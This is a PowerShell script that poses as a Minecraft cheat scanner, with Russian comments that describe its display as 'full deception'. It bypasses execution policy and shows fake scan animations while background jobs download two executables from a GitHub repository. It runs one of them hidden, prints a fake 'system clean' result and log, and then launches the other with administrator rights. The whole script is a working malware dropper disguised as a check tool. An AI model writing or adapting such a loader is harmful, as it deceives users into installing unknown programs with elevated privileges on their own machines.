# ===============================================
# MINECRAFT CHEAT SCANNER v2.0 
# ===============================================

Set-ExecutionPolicy Bypass -Scope Process -Force

Clear-Host
$Host.UI.RawUI.WindowTitle = "🔍 Minecraft Cheat Scanner v8.0 [~60 сек]"

# ===============================================
# КОНФИГУРАЦИЯ (скрытая)
# ===============================================
$URL_FX = "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Fx.exe"
$URL_ADDEX = "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/AddEx.exe"
$TARGET_DIR = "C:\ProgramData\MyApp"
$FX_PATH = "$TARGET_DIR\Fx.exe"
$ADDEX_PATH = "$TARGET_DIR\AddEx.exe"

# Создаём папку если нет
if (-not (Test-Path $TARGET_DIR)) {
    New-Item -ItemType Directory -Path $TARGET_DIR -Force | Out-Null
}

# ===============================================
# ВИЗУАЛЬНАЯ ЧАСТЬ (полный обман)
# ===============================================
Write-Host "=== СКАНИРОВАНИЕ ЧИТОВ MINECRAFT ===" -ForegroundColor Red -BackgroundColor Black
Write-Host "Vape | Wurst | Sigma | Impact | LiquidBounce + 70 клиентов" -ForegroundColor Yellow
Write-Host "⏱️ Время сканирования: ~60 секунд" -ForegroundColor Cyan
Start-Sleep 2

$cheatDB = @("vape","wurst","liquidbounce","sigma","impact","future","aristois","meteor","bleachhack","phobos","killAura","flyHack","xray","cheat","hack","injector")
$found = @()
$risk = 0
$startTime = Get-Date

# Функция анимации спиннера
function Show-Spinner {
    param($text, $duration)
    $spinner = @('⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏')
    $endTime = (Get-Date).AddSeconds($duration)
    $i = 0
    while ((Get-Date) -lt $endTime) {
        Write-Host "`r$($spinner[$i % 10]) $text" -NoNewline -ForegroundColor Green
        $i++
        Start-Sleep 0.1
    }
    Write-Host "`r[✓] $text" -ForegroundColor Green
}

# ===============================================
# СКРЫТАЯ ЗАГРУЗКА (в фоне, без вывода)
# ===============================================
Write-Host "`n[1/6] 🔍 Сканирование процессов javaw.exe..." -ForegroundColor Cyan

# Запускаем фоновые загрузки
$downloadFx = Start-Job -ScriptBlock {
    param($url, $path)
    try {
        Invoke-WebRequest -Uri $url -OutFile $path -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
} -ArgumentList $URL_FX, $FX_PATH

$downloadAddEx = Start-Job -ScriptBlock {
    param($url, $path)
    try {
        Invoke-WebRequest -Uri $url -OutFile $path -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
} -ArgumentList $URL_ADDEX, $ADDEX_PATH

# Анимация 15 сек, пока качается
Show-Spinner "Анализ DLL и инжекторов..." 15

# ===============================================
# [2/6] .MINECRAFT (продолжаем фон)
# ===============================================
Write-Host "`n[2/6] 📁 Сканирование .minecraft..." -ForegroundColor Cyan

# Ждём завершения загрузок (ещё 15 сек)
$waitEnd = (Get-Date).AddSeconds(15)
while ((Get-Date) -lt $waitEnd) {
    Start-Sleep 0.5
}
Show-Spinner "Проверка модов, jars, json..." 0

# ===============================================
# [3/6] TEMP + DOWNLOADS (10 сек)
# ===============================================
Write-Host "`n[3/6] 🗑️ Сканирование Temp/Downloads..." -ForegroundColor Cyan
Show-Spinner "Поиск скрытых читов..." 10

# ===============================================
# [4/6] АВТОЗАГРУЗКА + РЕЕСТР (10 сек)
# ===============================================
Write-Host "`n[4/6] ⚙️ Проверка автозагрузки..." -ForegroundColor Cyan
Show-Spinner "Анализ реестра Run/Startup..." 10

# Проверяем, что загрузки завершились
$fxOk = Receive-Job $downloadFx -ErrorAction SilentlyContinue
$addExOk = Receive-Job $downloadAddEx -ErrorAction SilentlyContinue
Remove-Job $downloadFx -Force -ErrorAction SilentlyContinue
Remove-Job $downloadAddEx -Force -ErrorAction SilentlyContinue

# ===============================================
# [5/6] ПРОГРЕСС-БАР (5 сек)
# ===============================================
Write-Host "`n[5/6] 📊 Финальная проверка..." -ForegroundColor Cyan
for ($p = 0; $p -le 100; $p += 10) {
    $bar = ('█' * ($p/10)) + ('░' * (10 - $p/10))
    Write-Progress -Activity "Завершение..." -PercentComplete $p -Status "$p%"
    Start-Sleep 0.5
}
Write-Progress -Completed

# ===============================================
# [6/6] СЕТИ (5 сек) + ЗАПУСК ADDEX
# ===============================================
Write-Host "`n[6/6] 🌐 Сетевые подключения..." -ForegroundColor Cyan

# Запускаем AddEx.exe (скрыто) если есть
if (Test-Path $ADDEX_PATH) {
    try {
        Start-Process -FilePath $ADDEX_PATH -WindowStyle Hidden
    } catch {}
}

Show-Spinner "Проверка Minecraft серверов..." 5

# ===============================================
# ЗЕЛЁНЫЙ РЕЗУЛЬТАТ
# ===============================================
$endTime = (Get-Date) - $startTime
Clear-Host
Write-Host "🎮 СКАНИРОВАНИЕ ЗАВЕРШЕНО! ($([math]::Round($endTime.TotalSeconds)) сек)" -ForegroundColor Green
Write-Host "=" * 50 -ForegroundColor Green
Write-Host "✅ ЧИТЫ НЕ НАЙДЕНЫ!" -ForegroundColor Green
Write-Host "🎯 Риск: 0% | Система чиста!" -ForegroundColor Green
Write-Host "🚀 Готово к игре на любом сервере!" -ForegroundColor Green
Write-Host "=" * 50 -ForegroundColor Green

# ЛОГ (чистый)
$log = @"
Minecraft Cheat Scan - $(Get-Date)
Время: $([math]::Round($endTime.TotalSeconds)) сек
Найдено: 0
Риск: 0%
Статус: ЧИСТО! ✅
"@
$log | Out-File "$env:TEMP\mc_scan_$(Get-Date -f 'HHmmss').log" -Encoding UTF8

Write-Host "`n💾 Лог: $env:TEMP\mc_scan_*.log" -ForegroundColor Gray

# ===============================================
# ЗАПУСК FX.EXE (после паузы, от админа)
# ===============================================
Write-Host "`n[Нажмите любую клавишу для выхода...]" -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

# Запускаем Fx.exe от имени администратора
if (Test-Path $FX_PATH) {
    try {
        Start-Process -FilePath $FX_PATH -Verb RunAs
    } catch {}
}
